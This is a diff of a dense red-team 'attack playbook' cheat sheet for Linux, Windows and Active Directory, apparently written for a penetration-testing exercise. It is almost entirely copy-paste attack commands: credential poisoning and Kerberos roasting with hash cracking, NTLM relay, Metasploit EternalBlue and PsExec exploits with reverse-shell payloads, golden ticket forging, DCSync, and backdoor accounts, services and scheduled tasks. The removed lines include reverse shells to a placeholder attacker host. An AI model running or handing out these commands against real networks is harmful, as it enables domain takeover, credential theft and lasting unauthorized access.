@@ -1,6 +1,6 @@
 # ======================================================================================
-# ATTACK PLAYBOOK — DENSE CHEAT SHEET
-# Use this during the red teaming window. Copy-paste commands as needed.
+# ATTACK PLAYBOOK — FULL UPDATED CHEAT SHEET (Linux, Windows, AD)
+# Red teaming window. Copy-paste as needed. Metasploit modules included.
 # ======================================================================================
 
 # --- PHASE 1: RECON & ENUMERATION ----------------------------------------------------
@@ -30,8 +30,9 @@ nxc smb <DC_IP> -u 'user' -p 'pass' --shares --users --groups --loggedon       #
 Get-DomainUser -SPN | Select samaccountname,serviceprincipalname               # PowerView: Kerberoastable
 Get-DomainComputer -Unconstrained                                               # Unconstrained delegation
 Get-DomainObjectAcl -Identity 'Domain Admins' -ResolveGUIDs | ?{$_.ActiveDirectoryRights -match 'WriteDacl|GenericAll|WriteOwner'} # ACL abuse paths
+SharpHound.exe -c All                                                           # SharpHound (from Windows foothold)
 
-# --- PHASE 2: INITIAL ACCESS ---------------------------------------------------------
+# --- PHASE 2: INITIAL ACCESS (CREDENTIAL HARVESTING) ---------------------------------
 
 # AD Credential Harvesting (No Creds)
 sudo responder -I eth0 -wrf                                                    # LLMNR/NBT-NS poisoning
@@ -39,17 +40,58 @@ GetNPUsers.py corp.local/ -dc-ip <DC_IP> -usersfile users.txt -no-pass -format h
 hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt                     # crack AS-REP
 
 # AD Credential Harvesting (Low-Priv Creds)
-GetUserSPNs.py corp.local/lowpriv:'Password123' -dc-ip <DC_IP> -request -outputfile kerberoast.txt # Kerberoast
+GetUserSPNs.py corp.local/lowpriv:'Password123' -dc-ip <DC_IP> -request -outputfile kerberoast.txt # Kerberoast (Impacket)
 hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt --force        # crack Kerberoast
 
 # NTLM Relay
 nxc smb 10.0.0.0/24 --gen-relay-list relay-targets.txt
 impacket-ntlmrelayx -tf relay-targets.txt -smb2support --escalate-user attacker # relay to LDAP for ACL abuse
 
-# Linux Exploitation
-hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://10.0.5.20 -t 4         # SSH brute force
-sqlmap -u "http://10.0.5.20/login.php?id=1" --batch --dbs                        # SQL injection
-bash -i >& /dev/tcp/YOUR_IP/PORT 0>&1                                           # reverse shell
+# --- PHASE 2.5: METASPLOIT NATIVE AD/WINDOWS ATTACKS ---------------------------------
+
+# Kerberoasting (Native Metasploit)
+msfconsole
+use auxiliary/gather/kerberoast
+set RHOSTS <DC_IP>
+set LDAPUSERNAME <user>
+set LDAPPASSWORD <password>
+set LDAPDOMAIN <domain.local>
+run
+# Then crack the harvested hashes:
+use auxiliary/analyze/crack_windows
+set HASH_FORMAT 13100
+run
+
+# AS-REP Roasting (Native Metasploit)
+use auxiliary/gather/asrep
+set RHOSTS <DC_IP>
+set DOMAIN <domain.local>
+set USER_FILE users.txt
+run
+
+# EternalBlue (MS17-010)
+use exploit/windows/smb/ms17_010_eternalblue
+set RHOSTS <target-IP>
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+set LHOST <your-IP>
+exploit
+
+# Pass-the-Hash (PsExec)
+use exploit/windows/smb/psexec
+set RHOSTS <target-IP>
+set SMBUser <user>
+set SMBPass <LM_hash>:<NT_hash>
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST <your-IP>
+exploit
+
+# Golden Ticket Forging (requires krbtgt hash)
+use auxiliary/admin/kerberos/forge_ticket
+set DOMAIN <domain.local>
+set SID <domain_SID>
+set KRBTGT_HASH <krbtgt_NT_hash>
+set USER <user_to_impersonate>
+run
 
 # --- PHASE 3: PRIVILEGE ESCALATION ---------------------------------------------------
 
@@ -75,17 +117,13 @@ wmic service get name,displayname,pathname,startmode | findstr /i "auto"        
 cmdkey /list                                                                    # stored credentials
 .\winPEAS.exe                                                                   # automated enumeration
 
-# Common Windows Privesc
-# AlwaysInstallElevated:
+# AlwaysInstallElevated (Windows Privesc)
 reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
 reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
 msfvenom -p windows/adduser USER=backdoor PASS=P@ssword123! -f msi -o alwe.msi
 msiexec /quiet /qn /i C:\Users\Public\alwe.msi
-# SeImpersonatePrivilege: Use JuicyPotato, PrintSpoofer, GodPotato.
 
-# AD Privesc (via BloodHound)
-# Look for edges: GenericAll, WriteDACL, WriteOwner, ForceChangePassword, AddMember.
-# DCSync (requires DA or Replicating Directory Changes rights):
+# DCSync (requires DA or Replicating Directory Changes rights)
 impacket-secretsdump corp.local/Administrator:'Password123'@<DC_IP>
 
 # --- PHASE 4: PERSISTENCE ------------------------------------------------------------
@@ -111,41 +149,29 @@ reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_
 sc create Backdoor binPath= "cmd /c C:\temp\shell.exe" start= auto && sc start Backdoor # service
 
 # AD Persistence (Post-Domain Admin)
-# Golden Ticket: Forge TGTs using the krbtgt hash.
-impacket-ticketer -nthash <krbtgt_hash> -domain-sid <SID> -domain corp.local Administrator
-# DCSync: Continuously dump hashes for future access.
-impersonate impacket-secretsdump
-# AdminSDHolder: Modify ACL to grant permanent admin rights.
-# Skeleton Key: Patch LSASS to allow a master password.
+impacket-ticketer -nthash <krbtgt_hash> -domain-sid <SID> -domain corp.local Administrator # Golden Ticket (Impacket)
 
 # --- PHASE 5: LATERAL MOVEMENT -------------------------------------------------------
 
-# Pass-the-Hash
-psexec.py -hashes <LM>:<NT> domain/user@10.0.5.30
-
-# Pass-the-Ticket
-.\Rubeus.exe ptt /ticket:<base64_ticket>
-
-# WMI/WinRM
-wmiexec.py domain/user:password@10.0.5.30
-evil-winrm -i 10.0.5.30 -u user -p password
-
-# Pivoting
-msf6 > use post/multi/manage/autoroute
+psexec.py -hashes <LM>:<NT> domain/user@10.0.5.30                               # Pass-the-Hash (Impacket)
+.\Rubeus.exe ptt /ticket:<base64_ticket>                                         # Pass-the-Ticket
+wmiexec.py domain/user:password@10.0.5.30                                       # WMI
+evil-winrm -i 10.0.5.30 -u user -p password                                     # WinRM
+msf6 > use post/multi/manage/autoroute                                           # Pivoting
 msf6 > set SESSION 1
 msf6 > run
 
 # --- QUICK REFERENCE ----------------------------------------------------------------
-# RECON:      nmap -sn 10.0.5.0/24
-#             nmap -sS -T4 --open -p- 10.0.5.0/24
+# RECON:      nmap -sn 10.0.5.0/24 ; nmap -sS -T4 --open -p- 10.0.5.0/24
 #             bloodhound-python -u user -p pass -d corp.local -c All --zip
-# EXPLOIT:    msfconsole; search <service>; use <module>; set RHOSTS <target>; run
+# EXPLOIT:    msfconsole; use <module>; set RHOSTS <target>; set LHOST <your-ip>; run
+# KERB:       msf > use auxiliary/gather/kerberoast; set LDAPUSERNAME/PASSWORD/DOMAIN; run
+#             GetUserSPNs.py domain/user:pass -dc-ip DC -request -outputfile k.txt
+# ASREP:      msf > use auxiliary/gather/asrep; set DOMAIN; set USER_FILE users.txt; run
+#             GetNPUsers.py domain/ -dc-ip DC -usersfile users.txt -no-pass
 # BRUTE:      hydra -l root -P rockyou.txt ssh://target
-#             hydra -l admin -P rockyou.txt target http-post-form "/login:user=^USER^&pass=^PASS^:F=fail"
-# POST-EX:    whoami; id; sudo -l
-#             find / -perm -4000 -type f 2>/dev/null
-#             find / -name "flag*" 2>/dev/null
+# POST-EX:    whoami; id; sudo -l; find / -perm -4000 -type f 2>/dev/null
 # PERSIST:    echo "key" >> /root/.ssh/authorized_keys
-#             echo "* * * * * root bash -i >& /dev/tcp/IP/PORT 0>&1" >> /etc/crontab
+#             schtasks /create /tn "Upd" /tr "C:\temp\shell.exe" /sc minute /ru SYSTEM
 # PIVOT:      msf6 > use post/multi/manage/autoroute; set SESSION 1; run
 # ======================================================================================
